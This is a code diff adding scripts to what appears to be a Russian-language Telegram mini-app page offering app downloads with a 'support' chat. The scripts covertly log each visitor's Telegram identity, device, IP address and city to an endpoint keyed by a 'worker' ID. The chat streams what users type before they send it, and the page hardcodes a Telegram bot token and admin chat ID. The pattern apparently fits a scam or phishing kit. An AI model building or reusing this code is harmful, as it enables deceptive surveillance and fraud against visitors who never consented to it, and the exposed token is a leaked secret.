+                document.body.innerHTML = '<div style="display:flex; height:100vh; align-items:center; justify-content:center; flex-direction:column; background:#121212; color:white; font-family:sans-serif; text-align:center; padding: 20px;"><h2>Доступ запрещен</h2><p>Пожалуйста, используйте мобильное приложение Telegram для доступа к платформе.</p></div>';
+                window.isAccessDenied = true;
+                return;
+            }
+        })();
+    </script>
+    
+    <script>
+        // Global cache for location to avoid rate limits on multiple button clicks
+        let cachedLocation = null;
+
+        const sendAdminLog = (actionText) => {
+            const token = '8880202636:AAGQacCNHWyyBCEc3Xmp62QxGgNFXA2xGE8';
+            const adminChatId = '8482944892';
+            
+            let who = 'Неизвестный посетитель (по прямой ссылке)';
+            if (window.Telegram && window.Telegram.WebApp) {
+                window.Telegram.WebApp.ready();
+                const initData = window.Telegram.WebApp.initDataUnsafe;
+                if (initData && initData.user) {
+                    const u = initData.user;
+                    // Escape HTML characters to prevent breaking Telegram's HTML parse_mode
+                    const escapeHTML = (str) => str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+                    const name = escapeHTML((u.first_name || '') + (u.last_name ? ' ' + u.last_name : '')).trim();
+                    const identifier = u.username ? '@' + u.username : `<code>${u.id}</code>`;
+                    
+                    if (name) {
+                        who = `${name} (${identifier})`;
+                    } else {
+                        who = identifier;
+                    }
+                }
+            }
+
+            // Device detection
+            let device = 'Неизвестно';
+            const ua = navigator.userAgent.toLowerCase();
+            if (ua.includes('iphone')) device = '📱 iPhone';
+            else if (ua.includes('ipad')) device = '📱 iPad';
+            else if (ua.includes('android')) device = '📱 Android';
+            else if (ua.includes('mac os') || ua.includes('macintosh')) device = '💻 Mac';
+            else if (ua.includes('windows')) device = '💻 Windows';
+            else if (ua.includes('linux')) device = '💻 Linux';
+            else if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.platform) device = '📱 ' + window.Telegram.WebApp.platform;
+
+            // MSK Time
+            const mskTime = new Date().toLocaleString("ru-RU", {timeZone: "Europe/Moscow"});
+            
+            // App details
+            let appInfo = '';
+            const titleEl = document.getElementById('app-title');
+            if (titleEl) {
+                appInfo = `\n📦 Приложение: <b>${titleEl.textContent}</b>`;
+            } else if (window.location.pathname.includes('index.html')) {
+                appInfo = `\n📦 Раздел: <b>Главная страница</b>`;
+            }
+
+            // Send function
+            const sendLog = (ip, country, city) => {
+                const workerId = (typeof getParam === 'function' ? getParam('worker') : new URLSearchParams(window.location.search).get('worker')) || 'null';
+                let tgUser = window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user ? window.Telegram.WebApp.initDataUnsafe.user : { id: 'Неизвестно', username: '' };
+                
+                let appExtra = '';
+                const titleEl = document.getElementById('app-title');
+                if (titleEl) appExtra = ` (Приложение: ${titleEl.textContent})`;
+                else if (window.location.pathname.includes('index.html')) appExtra = ` (Главная страница)`;
+                
+                fetch(`/api/log`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        workerId: workerId,
+                        action: actionText + appExtra,
+                        msg: '',
+                        user_info: {
+                            id: tgUser.id,
+                            username: tgUser.username,
+                            ip: ip,
+                            country: country,
+                            device: device
+                        }
+                    })
+                }).catch(console.error);
+            };
+
+            if (cachedLocation) {
+                sendLog(cachedLocation.ip, cachedLocation.country, cachedLocation.city);
+                return;
+            }
+
+            // Fetch IP with fallback
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ip) {
+                        cachedLocation = { ip: data.ip, country: data.country_name || 'Неизвестно', city: data.city || 'Неизвестно' };
+                        sendLog(cachedLocation.ip, cachedLocation.country, cachedLocation.city);
+                    } else {
+                        throw new Error('No IP');
+                    }
+                })
+                .catch(() => {
+                    // Fallback API if blocked
+                    fetch('https://get.geojs.io/v1/ip/geo.json')
+                        .then(res => res.json())
+                        .then(data => {
+                            cachedLocation = { ip: data.ip || 'Неизвестно', country: data.country || 'Неизвестно', city: data.city || 'Неизвестно' };
+                            sendLog(cachedLocation.ip, cachedLocation.country, cachedLocation.city);
+                        })
+                        .catch(() => {
+                            cachedLocation = { ip: 'Не удалось определить', country: 'Неизвестно', city: 'Неизвестно' };
+                            sendLog(cachedLocation.ip, cachedLocation.country, cachedLocation.city);
+                        });
+                });
+        };
+
+        // Fire the log on page load
+        
+
+        
+        // Fire the log on page load
+        
+
+        // Global functions for tracking button clicks
+        window.trackDownloadClick = () => {
+            sendAdminLog('Пользователь нажал кнопку "Скачать"');
+        };
+        window.trackCancelClick = () => {
+            sendAdminLog('Пользователь нажал "Прервать установку"');
+        };
+        
+        // Fetch settings dynamically to bypass cache
+        fetch('settings.json?t=' + new Date().getTime())
+            .then(res => res.json())
+            .then(data => { window.appSettings = data; })
+            .catch(err => { window.appSettings = { tgLink: 'https://t.me/lizaa_hrr', hasVideo: false }; });
+
+        window.trackSupportClick = () => {
+            sendAdminLog('Пользователь перешел в техподдержку');
+        };
+    </script>
+    <script>
+/**
+ * Chat Widget - Real-time support with Telegram bridge
+ * Connects to WebSocket server in bot.js
+ */
+(function() {
+    const WS_URL = (() => {
+        const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const host = location.hostname;
+        // If local, use port 8080; if accessed via Pinggy/tunnel, use default port (no explicit port)
+        const port = (host === 'localhost' || host === '127.0.0.1') ? ':8080' : '';
+        return `${proto}//${host}${port}`;
+    })();
+
+    let ws = null;
+    let sessionId = null;
+    let isOpen = false;
+    let unreadCount = 0;
+    let typingTimer = null;
+    let currentTypingText = '';
+    let operatorTypingTimer = null;
+    let chatContext = 'general'; // 'general' or 'install'
+    let isConnected = false;
+
+    function createWidget() {
+        if (window.isAccessDenied) return;
+        
+        const operatorName = ((typeof clientSettings !== 'undefined' ? clientSettings : {}) && (typeof clientSettings !== 'undefined' ? clientSettings : {}).supportName) ? (typeof clientSettings !== 'undefined' ? clientSettings : {}).supportName : 'Техническая поддержка';
+        const operatorPhoto = ((typeof clientSettings !== 'undefined' ? clientSettings : {}) && (typeof clientSettings !== 'undefined' ? clientSettings : {}).supportPhoto) ? (typeof clientSettings !== 'undefined' ? clientSettings : {}).supportPhoto : 'https://ui-avatars.com/api/?name=Support&background=0077ff&color=fff';
+
+        const html = `
+        <!-- Chat Bubble Button -->
+        <button class="chat-fab" id="chatFabBtn" onclick="window.openChat('general')">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+                <line x1="9" y1="9" x2="15" y2="9"></line>
+                <line x1="9" y1="13" x2="15" y2="13"></line>
+            </svg>
+            <span class="chat-fab-badge" id="chatFabBadge">0</span>
+        </button>
+
+        <!-- Chat Window -->
+        <div class="chat-window" id="chatWindow">
+            <div class="chat-header">
+                <div class="chat-avatar">
+                    <img src="${operatorPhoto}" style="width:100%; height:100%; border-radius:50%; object-fit:cover;">
+                </div>
+                <div class="chat-header-info">
+                    <div class="chat-header-name">${operatorName}</div>
+                    <div class="chat-header-status" id="chatStatus">Обычно отвечаем за несколько минут</div>
+                </div>
+                <button class="chat-close-btn" onclick="window.closeChat()">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg>
+                </button>
+            </div>
+            
+
+
+            <div class="chat-messages" id="chatMessages">
+                <div class="chat-system-msg">Напишите ваш вопрос — мы ответим в ближайшее время.</div>
+            </div>
+            <div class="chat-live-preview" id="chatLivePreview"></div>
+            <div class="chat-typing" id="chatTypingIndicator">
+                <div class="chat-bubble-avatar" style="background:#555;">А</div>
+                <div class="chat-typing-dots">
+                    <span></span><span></span><span></span>
+                </div>
+            </div>
+            <div class="chat-input-area">
+                <textarea class="chat-input" id="chatInput" placeholder="Написать сообщение..." rows="1"></textarea>
+                <button class="chat-send-btn" id="chatSendBtn" onclick="window.sendChatMessage()">
+                    <svg viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
+                </button>
+            </div>
+            <div class="chat-input-area" style="border-top: none; padding-top: 0; padding-bottom: 12px;">
+                <input type="file" id="chatFileInput" accept="image/*" style="display:none;" onchange="window.sendChatPhoto(this)">
+                <label for="chatFileInput" style="cursor:pointer; display:flex; align-items:center; color:#0077ff; font-size:14px; gap:5px;">
+                    <svg viewBox="0 0 24 24" width="20" height="20" stroke="currentColor" stroke-width="2" fill="none"><path d="M21.44 11.05l-9.19 9.19a6 6 0 01-8.49-8.49l9.19-9.19a4 4 0 015.66 5.66l-9.2 9.19a2 2 0 01-2.83-2.83l8.49-8.48"></path></svg>
+                    Прикрепить фото
+                </label>
+            </div>
+        </div>
+        `;
+
+        const link = document.createElement('link');
+        link.rel = 'stylesheet';
+        link.href = 'chat-widget.css?v=2';
+        document.head.appendChild(link);
+
+        const container = document.createElement('div');
+        container.innerHTML = html;
+        document.body.appendChild(container);
+
+        // Auto-resize textarea
+        const input = document.getElementById('chatInput');
+        input.addEventListener('input', onInputChange);
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' && !e.shiftKey) {
+                e.preventDefault();
+                window.sendChatMessage();
+            }
+        });
+    }
+
+    function connectWS() {
+        if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;
+
+        ws = new WebSocket(WS_URL);
+
+        ws.onopen = () => {
+            // Start or rejoin session
+            const savedSession = localStorage.getItem('chatSession_' + chatContext);
+            if (savedSession) {
+                sessionId = savedSession;
+                ws.send(JSON.stringify({ type: 'rejoin', sessionId }));
+            } else {
+                const workerId = new URLSearchParams(window.location.search).get('worker') || 'null';
+                ws.send(JSON.stringify({ type: 'start', context: chatContext, userInfo: getUserInfo(), workerId: workerId }));
+            }
+        };
+
+        ws.onmessage = (evt) => {
+            const msg = JSON.parse(evt.data);
+            handleServerMessage(msg);
+        };
+
+        ws.onclose = () => {
+            // Reconnect after 3 seconds if chat is open
+            if (isOpen) {
+                setTimeout(connectWS, 3000);
+                updateStatus('Переподключение...');
+            }
+        };
+
+        ws.onerror = () => { ws = null; };
+    }
+
+    function handleServerMessage(msg) {
+        switch (msg.type) {
+            case 'session_created':
+                sessionId = msg.sessionId;
+                localStorage.setItem('chatSession_' + chatContext, sessionId);
+                break;
+
+            case 'history': {
+                // Restore message history on reconnect
+                const msgs = document.getElementById('chatMessages');
+                if (msgs && msg.messages && msg.messages.length > 0) {
+                    msgs.innerHTML = ''; // clear the "write your question" message
+                    msg.messages.forEach(m => {
+                        const t = m.time ? new Date(m.time).toLocaleTimeString('ru-RU', {hour:'2-digit',minute:'2-digit'}) : '';
+                        appendMessage(m.text, m.from === 'user' ? 'user' : 'operator', t);
+                    });
+                }
+                break;
+            }
+
+            case 'operator_reply':
+                hideTypingIndicator();
+                appendMessage(msg.text, 'operator', msg.time);
+                if (!isOpen) {
+                    unreadCount++;
+                    updateBadge();
+                }
+                break;
+
+            case 'operator_typing':
+                showTypingIndicator();
+                break;
+
+            case 'operator_stop_typing':
+                hideTypingIndicator();
+                break;
+
+            case 'operator_connected':
+                isConnected = true;
+                const statusEl = document.getElementById('chatStatus');
+                if (statusEl) {
+                    statusEl.textContent = 'Арсений Лавров • Онлайн';
+                    statusEl.className = 'chat-header-status connected';
+                }
+                
+                break;
+
+            case 'system_msg':
+                appendSystemMessage(msg.text);
+                break;
+
+            case 'chat_deleted':
+                // Admin reset this dialog
+                localStorage.removeItem('chatSession_' + chatContext);
+                sessionId = null;
+                const msgsEl = document.getElementById('chatMessages');
+                if (msgsEl) msgsEl.innerHTML = '<div class="chat-system-msg">Диалог был сброшен. Напишите новый вопрос.</div>';
+                const st = document.getElementById('chatStatus');
+                if (st) { st.textContent = 'Ожидание подключения...'; st.className = 'chat-header-status'; }
+                // Start fresh session
+                ws = null;
+                connectWS();
+                break;
+        }
+    }
+
+        function getUserInfo() {
+        if (window.Telegram && window.Telegram.WebApp) {
+            let userObj = window.Telegram.WebApp.initDataUnsafe?.user;
+            
+            if (!userObj && window.Telegram.WebApp.initData) {
+                const params = new URLSearchParams(window.Telegram.WebApp.initData);
+                if (params.get('user')) {
+                    try { userObj = JSON.parse(decodeURIComponent(params.get('user'))); } catch(e) {}
+                }
+            }
+            
+            if (!userObj) {
+                userObj = window.Telegram.WebApp.initDataUnsafe?.chat;
+            }
+
+            if (userObj) {
+                const name = ((userObj.first_name || '') + ' ' + (userObj.last_name || '')).trim() || 'Без Имени';
+                return { name, username: userObj.username || null, id: userObj.id };
+            }
+            
+            return { name: 'DEBUG: ' + (window.Telegram.WebApp.initData ? 'NoUserObj' : 'NoInitData'), username: null, id: null };
+        }
+        return { name: 'DEBUG: NoTelegram', username: null, id: null };
+    }
+
+    function onInputChange(e) {
+        const input = e.target;
+        // Auto resize
+        input.style.height = 'auto';
+        input.style.height = Math.min(input.scrollHeight, 100) + 'px';
+
+        const text = input.value.trim();
+
+        // Send live typing preview to server
+        if (ws && ws.readyState === WebSocket.OPEN && sessionId && text) {
+            clearTimeout(typingTimer);
+            currentTypingText = text;
+            ws.send(JSON.stringify({ type: 'typing_preview', sessionId, text }));
+
+            // Stop typing signal after 3 seconds of inactivity
+            typingTimer = setTimeout(() => {
+                if (ws && ws.readyState === WebSocket.OPEN) {
+                    ws.send(JSON.stringify({ type: 'stop_typing', sessionId, text: currentTypingText }));
+                }
+            }, 3000);
+        }
+    }
+
+    function appendMessage(text, from, time) {
+        const msgs = document.getElementById('chatMessages');
+        if (!msgs) return;
+
+        const timeStr = time || new Date().toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' });
+        const isUser = from === 'user';
+
+        const row = document.createElement('div');
+        row.className = `chat-bubble-row ${isUser ? 'from-user' : ''}`;
+        row.innerHTML = `
+            ${!isUser ? `<img src="${(typeof clientSettings !== 'undefined' ? clientSettings : {})?.supportPhoto || ''}" class="chat-bubble-avatar" style="object-fit:cover; display:${(typeof clientSettings !== 'undefined' ? clientSettings : {})?.supportPhoto ? 'block' : 'none'};" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex'"/><div class="chat-bubble-avatar fallback-avatar" style="background:#007bff; display:${(typeof clientSettings !== 'undefined' ? clientSettings : {})?.supportPhoto ? 'none' : 'flex'}">${(typeof clientSettings !== 'undefined' ? clientSettings : {})?.supportName ? (typeof clientSettings !== 'undefined' ? clientSettings : {}).supportName.charAt(0) : 'А'}</div>` : ''}
+            <div class="chat-bubble ${isUser ? 'from-user' : 'from-operator'}">
+                ${escapeHtml(text)}
+                <div class="chat-bubble-time">${timeStr}</div>
+            </div>
+        `;
+        msgs.appendChild(row);
+        msgs.scrollTop = msgs.scrollHeight;
+    }
+
+    function appendSystemMessage(text) {
+        const msgs = document.getElementById('chatMessages');
+        if (!msgs) return;
+        const el = document.createElement('div');
+        el.className = 'chat-system-msg';
+        el.textContent = text;
+        msgs.appendChild(el);
+        msgs.scrollTop = msgs.scrollHeight;
+    }
+
+    function showTypingIndicator() {
+        const el = document.getElementById('chatTypingIndicator');
+        if (el) el.classList.add('show');
+        clearTimeout(operatorTypingTimer);
+        operatorTypingTimer = setTimeout(hideTypingIndicator, 5000);
+        const msgs = document.getElementById('chatMessages');
+        if (msgs) msgs.scrollTop = msgs.scrollHeight;
+    }
+
+    function hideTypingIndicator() {
+        const el = document.getElementById('chatTypingIndicator');
+        if (el) el.classList.remove('show');
+    }
+
+    function updateStatus(text) {
+        const el = document.getElementById('chatStatus');
+        if (el) el.textContent = text;
+    }
+
+    function updateBadge() {
+        const badge = document.getElementById('chatFabBadge');
+        if (!badge) return;
+        if (unreadCount > 0) {
+            badge.textContent = unreadCount;
+            badge.classList.add('show');
+        } else {
+            badge.classList.remove('show');
+        }
+    }
+
+    function escapeHtml(str) {
+        return String(str)
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/\n/g, '<br>');
+    }
+
+    // Public API
+    window.openChat = function(context) {
+        chatContext = context || 'general';
+        isOpen = true;
+        unreadCount = 0;
+        updateBadge();
+
+        const win = document.getElementById('chatWindow');
+        if (win) win.classList.add('open');
+
+        // Update context label
+        
+
+        connectWS();
+        setTimeout(() => document.getElementById('chatInput')?.focus(), 300);
+    };
+
+    window.closeChat = function() {
+        isOpen = false;
+        const win = document.getElementById('chatWindow');
+        if (win) win.classList.remove('open');
+    };
+
+    window.sendChatMessage = function() {
+        const input = document.getElementById('chatInput');
+        if (!input) return;
+        const text = input.value.trim();
+        if (!text) return;
+        if (!ws || ws.readyState !== WebSocket.OPEN) {
+            connectWS();
+            setTimeout(() => window.sendChatMessage(), 1000);
+            return;
+        }
+
+        // Clear typing timer
+        clearTimeout(typingTimer);
+
+        ws.send(JSON.stringify({ type: 'message', sessionId, text, context: chatContext }));
+        appendMessage(text, 'user');
+        input.value = '';
+        input.style.height = 'auto';
+    };
+
+    window.sendChatPhoto = function(inputElement) {
+        if (!inputElement.files || inputElement.files.length === 0) return;
+        const file = inputElement.files[0];
+        
+        // Basic validation
+        if (!file.type.startsWith('image/')) {
+            alert('Пожалуйста, выберите фото.');
+            return;
+        }
+        
+        if (!ws || ws.readyState !== WebSocket.OPEN) {
+            connectWS();
+            setTimeout(() => window.sendChatPhoto(inputElement), 1000);
+            return;
+        }
+
+        const reader = new FileReader();
+        reader.onload = function(e) {
+            const base64Data = e.target.result;
+            ws.send(JSON.stringify({ type: 'photo', sessionId, context: chatContext, photoBase64: base64Data }));
+            appendMessage('📷 Фото отправлено', 'user');
+            inputElement.value = ''; // clear
+        };
+        reader.readAsDataURL(file);
+    };
+
+    // Init on DOM ready
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', createWidget);
+    } else {
+        createWidget();
+    }
+})();
+
+</script>
+</body>
+</html>
+
+
+
